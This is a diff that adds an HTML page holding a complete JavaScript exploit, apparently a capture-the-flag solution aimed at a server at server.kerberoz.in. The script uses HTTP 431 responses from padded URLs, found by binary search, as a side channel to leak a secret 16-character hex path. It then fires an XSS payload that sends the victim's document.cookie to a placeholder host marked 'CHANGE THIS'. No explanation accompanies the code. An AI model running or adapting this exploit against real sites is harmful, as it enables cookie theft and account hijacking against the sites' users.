@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<body>
+<script type="module">
+const BASE_URL = "http://server.kerberoz.in:3001";
+const EXFIL = "https://your-server.com/log"; // CHANGE THIS
+
+const CHARS = "0123456789abcdef".split("");
+const LENGTH = 16;
+
+const known = [];
+const win = open("");
+
+const getUrl = (prefix, padLength, xss) =>
+  `${BASE_URL}/${prefix.join("/")}?${new URLSearchParams({
+    xss,
+    pad: "x".repeat(padLength),
+  })}`;
+
+const got431 = (prefix, padLength) => {
+  const xss = 'opener.postMessage("ping","*")';
+  return new Promise((resolve) => {
+    window.onmessage = ({ data }) => {
+      if (data === "ping") resolve(false);
+    };
+    setTimeout(() => resolve(true), 300);
+    win.location = getUrl(prefix, padLength, xss);
+  });
+};
+
+let left = 0;
+let right = 18000;
+
+const getThreshold = async () => {
+  left -= 30;
+  while (right - left > 2) {
+    const mid = (right + left) >> 1;
+    if (await got431([...known, "_"], mid)) right = mid;
+    else left = mid;
+  }
+  return left;
+};
+
+(async () => {
+  while (known.length < LENGTH) {
+    const threshold = await getThreshold();
+    for (const c of CHARS) {
+      if (await got431([...known, c], threshold)) {
+        known.push(c);
+        break;
+      }
+    }
+  }
+
+  const finalUrl = getUrl(
+    known,
+    0,
+    `fetch("${EXFIL}?c=" + encodeURIComponent(document.cookie))`
+  );
+
+  win.location = finalUrl;
+})();
+</script>
+</body>
